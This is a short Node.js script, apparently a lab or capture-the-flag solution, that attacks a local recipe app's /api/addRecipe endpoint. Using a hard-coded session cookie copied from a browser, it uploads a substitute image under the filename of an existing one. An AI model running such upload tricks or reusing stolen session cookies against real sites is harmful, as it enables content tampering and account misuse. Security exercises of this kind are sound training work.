import axios from 'axios';
import FormData from 'form-data';
import fs from 'fs';
import getLocalIp from '../../getLocalIp.js'

const PORT = 5173;
const localIp = getLocalIp();
const sessionIdCopiedFromBrowser = "45aa2361-ef66-4cdb-ab3f-6300b4105ee5";

async function uploadHack() {
    const url = `http://${localIp}:${PORT}/api/addRecipe`;
    const boundary = "----------------------------068545562005799140548789";
    const filePath = "chocolate-cake.png"; // Adjust the file path as necessary
    const realFilePath = "../../spoilers/Poop_Emoji.png"; // Adjust the file path as necessary

    const formData = new FormData();
    formData.append("image", fs.createReadStream(realFilePath), {
        filename: filePath, //encodeURIComponent(filePath),
        contentType: "image/png"
    });
    formData.append("instructions", "test");
    formData.append("name", "test");

    try {
        const response = await axios.post(url, formData, {
            headers: {
                ...formData.getHeaders(),
                "Content-Type": `multipart/form-data; boundary=${boundary}`,
                "Cookie": `sessionId=${sessionIdCopiedFromBrowser}`
            }
        });

        if (response.status === 200) {
            console.log("Success:", response.data);
        } else {
            console.log("Failed:", response.status);
        }
    } catch (error) {
        console.error("Error:", error.message);
    }
}

uploadHack();
